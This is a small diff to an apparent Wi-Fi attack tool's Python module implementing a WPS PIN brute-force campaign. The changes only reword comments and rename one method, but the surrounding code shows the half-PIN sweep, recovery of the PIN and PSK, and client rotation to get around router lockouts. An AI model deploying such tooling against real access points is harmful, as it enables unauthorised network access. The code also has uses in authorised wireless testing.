@@ -10,7 +10,7 @@ Owns:
 - progress/ETA, and
 - pause()/resume() to prevent simultaneous TX attacks.
 
-Sweep / oracle wiring (see registrar.py):
+Sweep wiring (see registrar.py):
   COMMON_PINS, then first-half sweep until the AP returns M5
   (``first_half_ok``) → lock that P1 → second-half sweep until SUCCESS.
 """
@@ -51,7 +51,7 @@ class CampaignState:
     found_pin: Optional[str] = None
     found_psk: Optional[str] = None
     attempts: int = 0     # sessions started (incl. rate-limited no-ops)
-    tested: int = 0       # attempts that actually reached the M4 oracle
+    tested: int = 0       # attempts that actually reached the M4 answer (M5/NACK)
     updated: float = 0.0
 
 
@@ -137,7 +137,7 @@ class WpsCampaign(Campaign):
 
         # Live lock state for the SECURITY status row's countdown / kind display.
         # "hard" = beacon AP-Setup-Locked (the AP itself says it's not doing WPS);
-        # "soft" = our internal backoff after N consecutive pre-oracle rejects.
+        # "soft" = our internal backoff after N rejects before any PIN half is judged.
         self._lock_kind: Optional[str] = None
         self._lock_end_at: Optional[float] = None
         self._consecutive_locks_no_progress = 0
@@ -308,12 +308,12 @@ class WpsCampaign(Campaign):
             self.lock.note_setup_locked()
             return
         if out.result in (PinResult.PROTO_ERROR, PinResult.TIMEOUT):
-            self.lock.note_pre_oracle_reject()
+            self.lock.note_reject_before_pin_answer()
             return
 
         st.tested += 1
         self.lock.note_progress()
-        # A real M4 oracle result means the AP IS letting our rotated client through.
+        # A real M4 answer (M5/NACK) means the AP IS letting our rotated client through.
         self._consecutive_locks_no_progress = 0
 
         if st.phase == "verify":
@@ -494,7 +494,7 @@ class WpsCampaign(Campaign):
             return
         self.lock.begin_lock()
         # "hard" = AP itself advertises WPS locked in its beacons
-        # "soft" = our backoff after N pre-oracle rejects.
+        # "soft" = our backoff after N rejects before any PIN half is judged.
         self._lock_kind = "hard" if beacon_locked else "soft"
         trigger = "beacon" if beacon_locked else f"{self.lock.strikes} strikes"
         if wait:
